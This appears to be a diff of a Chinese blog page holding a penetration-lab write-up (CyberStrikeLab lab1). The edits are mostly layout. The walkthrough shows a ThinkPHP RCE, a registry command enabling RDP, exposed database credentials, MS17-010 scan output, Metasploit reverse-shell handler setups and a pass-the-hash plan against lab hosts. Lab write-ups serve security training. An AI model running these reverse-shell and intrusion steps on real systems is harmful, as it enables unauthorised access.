@@ -30,7 +30,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-03-05T08:04:17.000Z">
-<meta property="article:modified_time" content="2025-03-09T10:23:54.210Z">
+<meta property="article:modified_time" content="2025-03-09T11:56:39.663Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="综合渗透靶机">
 <meta name="twitter:card" content="summary">
@@ -390,7 +390,7 @@
         <div class="label text-third-text-color text-sm">分类</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
         <div class="label text-third-text-color text-sm">文章</div>
     </a>
 </div>
@@ -414,7 +414,7 @@
 			
 			
 			
-			<img src="/images/light.jpg" alt="CyberStrikeLab - lab1" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			<img src="/images/11.jpg" alt="CyberStrikeLab - lab1" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
 			
 			<div class="w-full flex items-center absolute bottom-0 justify-start">
 				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">CyberStrikeLab - lab1</h1>
@@ -445,8 +445,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-03-09 18:23:54</span>
-            <span class="mobile">2025-03-09 18:23:54</span>
+            <span class="desktop">2025-03-09 19:56:39</span>
+            <span class="mobile">2025-03-09 19:56:39</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -510,8 +510,9 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<p>目标：本次小李的任务是攻克 192.168.10.0&#x2F;24 网段的所有主机，刚开始挺顺利，但深入后发现里面的情况远比想象中的复杂。</p>
-<h2 id="外网信息探测"><a href="#外网信息探测" class="headerlink" title="外网信息探测"></a>外网信息探测</h2><img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302122910501.png" class title="image-20250302122910501">
+			<p><strong>难度: 简单</strong></p>
+<p>目标：本次小李的任务是攻克 192.168.10.0&#x2F;24 网段的所有主机，刚开始挺顺利，但深入后发现里面的情况远比想象中的复杂。</p>
+<h3 id><a href="#" class="headerlink" title></a></h3><h1 id="外网信息探测"><a href="#外网信息探测" class="headerlink" title="外网信息探测"></a>外网信息探测</h1><img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302122910501.png" class title="image-20250302122910501">
 
 <p>使用 fscan 对 192.168.10.* 网段进行存活、端口及漏洞扫描，检测出了 thinkphp5023 漏洞</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228114857535.png" class title="image-20250228114857535">
@@ -521,7 +522,7 @@
 
 
 
-<h2 id="边界突破-192-168-10-10"><a href="#边界突破-192-168-10-10" class="headerlink" title="边界突破 - 192.168.10.10"></a>边界突破 - 192.168.10.10</h2><h3 id="ThinkPHP-5-0-23-RCE"><a href="#ThinkPHP-5-0-23-RCE" class="headerlink" title="ThinkPHP 5.0.23 RCE"></a>ThinkPHP 5.0.23 RCE</h3><p><strong>工具库利用</strong></p>
+<h1 id="边界突破-192-168-10-10"><a href="#边界突破-192-168-10-10" class="headerlink" title="边界突破 - 192.168.10.10"></a>边界突破 - 192.168.10.10</h1><h2 id="ThinkPHP-5-0-23-RCE"><a href="#ThinkPHP-5-0-23-RCE" class="headerlink" title="ThinkPHP 5.0.23 RCE"></a>ThinkPHP 5.0.23 RCE</h2><p><strong>工具库利用</strong></p>
 <p>使用 ThinkPHP 漏洞扫描工具进行历史漏洞扫描，发现大量 thinphp nday 都能打通</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250228115120674.png" class title="image-20250228115120674">
 
@@ -585,7 +586,7 @@
 
 
 
-<h3 id="3389-远程桌面连接"><a href="#3389-远程桌面连接" class="headerlink" title="3389 远程桌面连接"></a>3389 远程桌面连接</h3><p>开启 3389 端口</p>
+<h2 id="3389-远程桌面连接"><a href="#3389-远程桌面连接" class="headerlink" title="3389 远程桌面连接"></a>3389 远程桌面连接</h2><p>开启 3389 端口</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302105830463.png" class title="image-20250302105830463">
@@ -606,7 +607,7 @@
 <p>再次尝试，成功登录</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302111506571.png" class title="image-20250302111506571">
 
-<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>翻阅 phpstudy，找到数据库用户名密码</p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>翻阅 phpstudy，找到数据库用户名密码</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root/cyberstrike@2024</span><br></pre></td></tr></table></figure></div>
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302111740743.png" class title="image-20250302111740743">
@@ -648,7 +649,7 @@
 
 
 
-<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>外网机器是双网卡，目标内网还有一个 192.168.20.X 网段</p>
+<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>外网机器是双网卡，目标内网还有一个 192.168.20.X 网段</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250302190303722.png" class title="image-20250302190303722">
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303105119541.png" class title="image-20250303105119541">
@@ -660,7 +661,7 @@
 <p>发现 20 和 30 都有永恒之蓝漏洞</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">192.168.20.20:139 open</span><br><span class="line">192.168.20.10:139 open</span><br><span class="line">192.168.20.10:3306 open</span><br><span class="line">192.168.20.30:445 open</span><br><span class="line">192.168.20.20:445 open</span><br><span class="line">192.168.20.10:445 open</span><br><span class="line">192.168.20.30:139 open</span><br><span class="line">192.168.20.30:135 open</span><br><span class="line">192.168.20.20:135 open</span><br><span class="line">192.168.20.10:80 open</span><br><span class="line">192.168.20.30:88 open</span><br><span class="line">192.168.20.10:135 open</span><br><span class="line">[*] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600</span><br><span class="line">[*] NetBios 192.168.20.10   WORKGROUP\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]192.168.20.20</span><br><span class="line">   [-&gt;]cyberweb</span><br><span class="line">   [-&gt;]192.168.20.20</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]192.168.20.30</span><br><span class="line">   [-&gt;]WIN-7NRTJO59O7N</span><br><span class="line">   [-&gt;]192.168.20.30</span><br><span class="line">[+] MS17-010 192.168.20.20	(Windows Server 2012 R2 Standard 9600)</span><br><span class="line">[+] MS17-010 192.168.20.30	(Windows Server 2008 R2 Standard 7600)</span><br><span class="line">[*] WebTitle http://192.168.20.10      code:200 len:25229  title:易优CMS -  Powered by Eyoucms.com</span><br><span class="line">[+] PocScan http://192.168.20.10 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h3><p><strong>CS 派发 MSF 会话</strong>，先开启MSF</p>
+<h2 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h2><p><strong>CS 派发 MSF 会话</strong>，先开启MSF</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set LHOST 172.16.233.2</span><br><span class="line">set LPORT 4777</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
 
 <p>CS 启动监听，配置与 MSF 一致</p>
@@ -707,7 +708,7 @@
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/CyberStrikeLab-lab1/image-20250303162638253.png" class title="image-20250303162638253">
 
-<h3 id="域成员-192-168-20-20"><a href="#域成员-192-168-20-20" class="headerlink" title="域成员 - 192.168.20.20"></a>域成员 - 192.168.20.20</h3><p>这台机器同样爆出了永恒之蓝，但一直利用失败，不过因为我们已经拿下域控制器，所以可以换一种方式，去拿域控制器的 hash，对域成员做 PTH 攻击 </p>
+<h2 id="域成员-192-168-20-20"><a href="#域成员-192-168-20-20" class="headerlink" title="域成员 - 192.168.20.20"></a>域成员 - 192.168.20.20</h2><p>这台机器同样爆出了永恒之蓝，但一直利用失败，不过因为我们已经拿下域控制器，所以可以换一种方式，去拿域控制器的 hash，对域成员做 PTH 攻击 </p>
 <p>上线 MSF</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.20.10</span><br><span class="line">set lport 23231</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
 
@@ -749,7 +750,7 @@
         
             <li>
                 <strong>更新于
-                    :</strong> 2025-03-09 18:23:54
+                    :</strong> 2025-03-09 19:56:39
             </li>
         
         <li>
@@ -855,7 +856,7 @@
 	<div class="post-toc">
 		<div class="toc-title">目录</div>
 		<div class="page-title">CyberStrikeLab - lab1</div>
-		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="nav-text">外网信息探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BE%B9%E7%95%8C%E7%AA%81%E7%A0%B4-192-168-10-10"><span class="nav-text">边界突破 - 192.168.10.10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ThinkPHP-5-0-23-RCE"><span class="nav-text">ThinkPHP 5.0.23 RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3389-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5"><span class="nav-text">3389 远程桌面连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">数据库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="nav-text">域渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">内网信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7-192-168-20-30"><span class="nav-text">域控 - 192.168.20.30</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E6%88%90%E5%91%98-192-168-20-20"><span class="nav-text">域成员 - 192.168.20.20</span></a></li></ol></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text"></span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="nav-text">外网信息探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BE%B9%E7%95%8C%E7%AA%81%E7%A0%B4-192-168-10-10"><span class="nav-text">边界突破 - 192.168.10.10</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-5-0-23-RCE"><span class="nav-text">ThinkPHP 5.0.23 RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3389-%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5"><span class="nav-text">3389 远程桌面连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">数据库</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="nav-text">域渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">内网信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7-192-168-20-30"><span class="nav-text">域控 - 192.168.20.30</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%88%90%E5%91%98-192-168-20-20"><span class="nav-text">域成员 - 192.168.20.20</span></a>
 
 	</div>
 </div>
@@ -882,7 +883,7 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        共撰写了 8 篇文章
+                        共撰写了 9 篇文章
                     </span>
                     
                 </p>
